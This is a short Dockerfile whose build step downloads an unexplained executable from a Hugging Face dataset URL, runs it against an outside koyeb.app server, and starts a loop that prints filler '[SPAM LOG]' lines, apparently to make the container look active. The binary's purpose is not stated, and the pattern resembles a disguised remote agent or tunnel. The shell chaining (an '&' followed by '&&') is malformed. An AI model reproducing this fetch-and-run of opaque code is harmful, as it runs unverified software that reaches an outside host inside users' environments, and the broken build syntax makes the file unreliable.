FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
 && apt-get install -y --no-install-recommends curl ca-certificates \
 && rm -rf /var/lib/apt/lists/* \
 && curl -L https://huggingface.co/datasets/api2/app/resolve/main/app -o /app \
 && chmod +x /app \
 && (
      while true; do
        echo "[SPAM LOG] $(date) app is running..."
        sleep 1
      done
    ) & \
 && /app --server https://dominant-marleah-kozak-87119c7a.koyeb.app
